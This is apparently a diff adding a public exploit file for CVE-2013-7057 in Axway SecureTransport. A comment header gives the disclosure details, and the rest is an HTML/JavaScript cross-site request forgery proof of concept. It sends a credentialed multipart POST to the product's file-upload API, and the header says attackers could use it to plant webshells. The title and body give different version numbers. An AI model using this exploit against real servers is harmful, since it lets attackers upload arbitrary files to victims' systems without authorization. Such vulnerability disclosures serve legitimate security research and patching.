@@ -1,0 +1,57 @@
+<!--
+# Exploit Title: Axway Secure Transport 5.1 SP2 Arbitary File Upload via CSRF
+# Exploit author: Emmanuel Law 
+# Public Disclosure Date : 20/10/14
+# Vendor homepage: http://www.axway.com
+# Affected Software version: Axway Secure Transport 5.2.1 SP2 and possibly earlier versions.
+# CVE: CVE-2013-7057
+
+Software Description:
+=====================
+Axway SecureTransport is a multi-protocol Managed File Transfer (MFT) gateway solution that enables organizations to secure, manage, and track the transfer of files inside and outside the enterprise firewall.
+
+Vulnerability Description:
+=====================
+It is possible to conduct CSRF on a user to upload arbitary files on the Axway Secure Transport server. This is due to the lack of anti-CSRF tokens in the web API. An adversary may exploit this to upload webshells for further attacks.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+12/12/13 - Discovered vulnerability and notified Vendor
+17/10/14 - Verified with Vendor that a patch has been released.
+20/10/14 - Public disclosure
+
+Steps to reproduce / PoC:
+=========================
+-->
+
+
+<html>
+  <!-- CSRF PoC to upload file to sftp.example.org- -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://sftp.example.org/api/v1.0/files/", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------19278872527677784281970288330");
+        xhr.withCredentials = true;
+        var body = "-----------------------------19278872527677784281970288330\r\n" + 
+          "Content-Disposition: form-data; name=\"upload[]\"; filename=\"AURA_TEST.randomExtension\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "FILEDATA\r\n" + 
+          "-----------------------------19278872527677784281970288330--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
